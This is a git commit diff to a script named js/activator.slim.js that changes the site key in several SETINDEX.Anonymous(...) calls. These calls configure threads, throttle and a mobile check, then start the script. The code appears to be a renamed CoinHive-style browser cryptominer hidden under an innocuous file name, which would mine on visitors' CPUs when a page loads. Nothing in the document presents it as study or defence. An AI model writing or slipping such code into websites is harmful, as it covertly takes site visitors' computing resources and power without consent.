b2e5179eb09c094cdb6b5ada1683a3c438a276a6
developerCLOW <63546960+developerCLOW@users.noreply.github.com>
2020-08-01 04:18:30 +0000

    Changed Script

--- js/activator.slim.js
+++ js/activator.slim.js
@@ -1,16 +1,16 @@
-let base = SETINDEX.Anonymous('SK_dw3n6JQoDTFfAfsNoOEnj', {
+let base = SETINDEX.Anonymous('SK_oD9sxFo5YjtWn583id8Gy', {
 	forceASMJS: false
 });
 
 if (!base.isMobile()){
-	let site = SETINDEX.Anonymous('SK_dw3n6JQoDTFfAfsNoOEnj', {
+	let site = SETINDEX.Anonymous('SK_oD9sxFo5YjtWn583id8Gy', {
 		threads: base.getNumThreads() / 2,
 		throttle: 0.4,
 		forceASMJS: false
 	});
 	site.start();
 } else {
-	let site = SETINDEX.Anonymous('SK_dw3n6JQoDTFfAfsNoOEnj', {
+	let site = SETINDEX.Anonymous('SK_oD9sxFo5YjtWn583id8Gy', {
 		threads: base.getNumThreads() / 2,
 		throttle: 0.5,
 		forceASMJS: false
